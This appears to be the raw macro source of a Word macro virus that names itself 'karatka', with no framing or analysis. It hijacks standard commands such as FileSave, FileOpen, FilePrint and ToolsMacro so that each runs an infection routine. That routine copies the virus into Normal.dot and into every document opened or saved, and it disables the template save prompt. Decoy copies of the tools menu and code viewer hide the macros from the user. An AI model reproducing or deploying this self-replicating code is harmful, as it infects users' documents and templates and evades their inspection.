   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "VileProperties"

   Public Sub MAIN()
   ' karatka!
   End Sub

   Attribute VB_Name = "FileProperties"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Shows the properties of the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileProperties.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   WordBasic.FileProperties
   30
   End Sub

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Changes the active template and the template options"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   30
   End Sub

   Attribute VB_Name = "XiewVBCode"

   Public Sub MAIN()
   'karatka!
   End Sub

   Attribute VB_Name = "VoolsMacro"

   Public Sub MAIN()
   ' karatka!
   End Sub

   Attribute VB_Name = "VileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VileSaveAs.MAIN"
   On Error GoTo -1: On Error GoTo 30
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   dlg.Format = 1
   WordBasic.FileSaveAs dlg
   WordBasic.ToolsMacro Name:="poreef", Run:=1, Show:=3, Description:="", NewName:=""
   WordBasic.FileSave
   30
   End Sub

   Attribute VB_Name = "ViewVBCode"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   WordBasic.FileProperties
   30
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   WordBasic.EditUndo
   30
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   WordBasic.FileSaveAs dlg
   30
   End Sub

   Attribute VB_Name = "VileMacro"

   Public Sub MAIN()
   ' karatka!
   End Sub

   Attribute VB_Name = "FilePrint"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Prints the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrint.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
   WordBasic.CurValues.FilePrint dlg
   WordBasic.Dialog.FilePrint dlg
   WordBasic.FilePrint dlg
   30
   End Sub

   Attribute VB_Name = "FileMacro"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   30
   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   WordBasic.FileClose
   30
   End Sub

   Attribute VB_Name = "VileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VileSave.MAIN"
   Dim a$
   On Error GoTo -1: On Error GoTo 40
   a$ = WordBasic.[WindowName$]()
   If a$ <> "Document1" Then GoTo 30
   WordBasic.ToolsMacro Name:="FileSaveAs", Run:=1, Show:=0, Description:="Saves a copy of the document in a separate file", NewName:=""
   30 WordBasic.FileSave
   40
   End Sub

   Attribute VB_Name = "VileOpen"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo 30

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg

   Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   dlg.Format = 1
   WordBasic.FileSaveAs dlg
   WordBasic.ToolsMacro Name:="poreef", Run:=1, Show:=3, Description:="", NewName:=""
   WordBasic.FileSave
   30
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   WordBasic.FileSave
   30
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Opens an existing document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg
   30
   End Sub

   Attribute VB_Name = "FileExit"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Quits Microsoft Word and prompts to save the documents"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   WordBasic.FileExit
   30
   End Sub

   Attribute VB_Name = "EditUndo"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Reverses the last action"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.EditUndo.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   WordBasic.EditUndo
   30
   End Sub

   Attribute VB_Name = "karatka"

   Public Sub MAIN()
   'karatka
   'karatka!
   'I name thee karatka!
   End Sub

   Attribute VB_Name = "FileNew"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Creates a new document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileNew.MAIN"
   On Error GoTo -1: On Error GoTo 30
   WordBasic.ToolsMacro Name:="inf", Run:=1, Show:=3, Description:="", NewName:=""
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileNew(False)
   WordBasic.CurValues.FileNew dlg
   WordBasic.Dialog.FileNew dlg
   WordBasic.FileNew dlg
   30
   End Sub

   Attribute VB_Name = "poreef"

   Public Sub MAIN()
   Dim x$
   Dim f$
   On Error GoTo -1: On Error GoTo 40
   x$ = "C:\Msoffice\Templates\Normal.dot"
   f$ = WordBasic.[FileName$]()
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:="C:\Msoffice\Templates\Normal.dot", Name:="inf", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:="C:\Msoffice\Templates\Normal.dot", Name:="karatka", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:="C:\Msoffice\Templates\Normal.dot", Name:="poreef", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QditUndo", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QditUndo", NewName:="EditUndo", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QileClose", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QileClose", NewName:="FileClose", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QileExit", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QileExit", NewName:="FileExit", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QileNew", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QileNew", NewName:="FileNew", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QileOpen", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QileOpen", NewName:="FileOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QilePrint", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QilePrint", NewName:="FilePrint", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QileProperties", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QileProperties", NewName:="FileProperties", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QileTemplates", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QileTemplates", NewName:="FileTemplates", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QileSave", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QileSave", NewName:="FileSave", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QileSaveAs", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QileSaveAs", NewName:="FileSaveAs", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QileMacro", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QileMacro", NewName:="FileMacro", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QoolsMacro", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QoolsMacro", NewName:="ToolsMacro", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="QiewVBCode", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="QiewVBCode", NewName:="ViewVBCode", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="ToolsMacro", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="ToolsMacro", NewName:="VoolsMacro", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileOpen", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileOpen", NewName:="VileOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileSave", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileSave", NewName:="VileSave", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileSaveAs", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileSaveAs", NewName:="VileSaveAs", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileProperties", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileProperties", NewName:="VileProperties", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileMacro", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileMacro", NewName:="VileMacro", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="ViewVBCode", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="ViewVBCode", NewName:="XiewVBCode", Tab:=3
   40
   End Sub

   Attribute VB_Name = "inf"

   Public Sub MAIN()
   Dim x$
   Dim f$
   WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="5", Password:="", WritePassword:="", RecommendReadOnly:=0
   x$ = WordBasic.[FileName$]()
   f$ = "C:\Msoffice\Templates\Normal.dot"
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:="C:\Msoffice\Templates\Normal.dot", Name:="inf", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:="C:\Msoffice\Templates\Normal.dot", Name:="karatka", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:="C:\Msoffice\Templates\Normal.dot", Name:="poreef", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="EditUndo", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="EditUndo", NewName:="QditUndo", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileClose", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileClose", NewName:="QileClose", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileExit", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileExit", NewName:="QileExit", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileNew", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileNew", NewName:="QileNew", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileOpen", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileOpen", NewName:="QileOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FilePrint", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FilePrint", NewName:="QilePrint", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileProperties", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileProperties", NewName:="QileProperties", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileTemplates", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileTemplates", NewName:="QileTemplates", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileSave", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileSave", NewName:="QileSave", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileSaveAs", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileSaveAs", NewName:="QileSaveAs", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="FileMacro", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="FileMacro", NewName:="QileMacro", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="ToolsMacro", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="ToolsMacro", NewName:="QoolsMacro", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="ViewVBCode", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="ViewVBCode", NewName:="QiewVBCode", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="VoolsMacro", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="VoolsMacro", NewName:="ToolsMacro", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="VileOpen", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="VileOpen", NewName:="FileOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="VileSave", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="VileSave", NewName:="FileSave", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="VileSaveAs", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="VileSaveAs", NewName:="FileSaveAs", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="VileProperties", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="VileProperties", NewName:="FileProperties", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="VileMacro", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="VileMacro", NewName:="FileMacro", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=x$, Destination:=f$, Name:="XiewVBCode", Tab:=3
   WordBasic.Organizer Rename:=1, Source:=f$, Name:="XiewVBCode", NewName:="ViewVBCode", Tab:=3

   End Sub
